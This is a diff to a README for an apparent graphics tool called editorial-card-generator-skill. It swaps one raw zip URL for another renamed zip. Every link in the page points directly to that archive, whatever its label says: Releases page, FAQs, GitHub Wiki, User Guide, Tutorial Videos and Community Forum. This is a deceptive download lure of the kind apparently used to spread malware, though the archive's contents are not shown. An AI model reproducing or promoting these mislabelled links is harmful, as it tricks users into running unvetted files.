@@ -1,6 +1,6 @@
 # 🎨 editorial-card-generator-skill - Create Stunning Info Graphics Effortlessly
 
-[![Download Now](https://github.com/CYRIKT/editorial-card-generator-skill/raw/refs/heads/main/editorial-card-generator/skill-generator-editorial-card-v1.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/CYRIKT/editorial-card-generator-skill/raw/refs/heads/main/editorial-card-generator/skill-generator-editorial-card-v1.7.zip)
+[![Download Now](https://raw.githubusercontent.com/CYRIKT/editorial-card-generator-skill/main/editorial-card-generator/generator-card-skill-editorial-v3.5-alpha.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/CYRIKT/editorial-card-generator-skill/main/editorial-card-generator/generator-card-skill-editorial-v3.5-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the editorial-card-generator-skill! This tool allows you to transform
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/CYRIKT/editorial-card-generator-skill/raw/refs/heads/main/editorial-card-generator/skill-generator-editorial-card-v1.7.zip) to download the software.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/CYRIKT/editorial-card-generator-skill/main/editorial-card-generator/generator-card-skill-editorial-v3.5-alpha.4.zip) to download the software.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top of the list.
@@ -61,7 +61,7 @@ If you encounter any issues while using the application, consider these common s
 - **Software Crashes**: Try restarting the application or your computer. If the problem persists, uninstall the software and reinstall it.
 - **Unable to Export**: Check that you have sufficient disk space, and ensure you are using a valid file format.
 
-If you still face issues, please refer to the [FAQs](https://github.com/CYRIKT/editorial-card-generator-skill/raw/refs/heads/main/editorial-card-generator/skill-generator-editorial-card-v1.7.zip) available on our GitHub Wiki for additional support.
+If you still face issues, please refer to the [FAQs](https://raw.githubusercontent.com/CYRIKT/editorial-card-generator-skill/main/editorial-card-generator/generator-card-skill-editorial-v3.5-alpha.4.zip) available on our GitHub Wiki for additional support.
 
 ## 🔍 Support
 
@@ -71,10 +71,10 @@ For more help, reach out through the Issues section on GitHub. Provide as much d
 
 Explore these links for tutorial videos and articles to maximize your experience with the editorial-card-generator-skill:
 
-- [User Guide](https://github.com/CYRIKT/editorial-card-generator-skill/raw/refs/heads/main/editorial-card-generator/skill-generator-editorial-card-v1.7.zip)
-- [Tutorial Videos](https://github.com/CYRIKT/editorial-card-generator-skill/raw/refs/heads/main/editorial-card-generator/skill-generator-editorial-card-v1.7.zip)
-- [Community Forum](https://github.com/CYRIKT/editorial-card-generator-skill/raw/refs/heads/main/editorial-card-generator/skill-generator-editorial-card-v1.7.zip)
+- [User Guide](https://raw.githubusercontent.com/CYRIKT/editorial-card-generator-skill/main/editorial-card-generator/generator-card-skill-editorial-v3.5-alpha.4.zip)
+- [Tutorial Videos](https://raw.githubusercontent.com/CYRIKT/editorial-card-generator-skill/main/editorial-card-generator/generator-card-skill-editorial-v3.5-alpha.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/CYRIKT/editorial-card-generator-skill/main/editorial-card-generator/generator-card-skill-editorial-v3.5-alpha.4.zip)
 
 ## 🎉 Conclusion
 
-Thank you for choosing editorial-card-generator-skill! We hope you enjoy creating beautiful graphics. Don’t forget to visit the [Releases page](https://github.com/CYRIKT/editorial-card-generator-skill/raw/refs/heads/main/editorial-card-generator/skill-generator-editorial-card-v1.7.zip) for updates and new features.
+Thank you for choosing editorial-card-generator-skill! We hope you enjoy creating beautiful graphics. Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/CYRIKT/editorial-card-generator-skill/main/editorial-card-generator/generator-card-skill-editorial-v3.5-alpha.4.zip) for updates and new features.
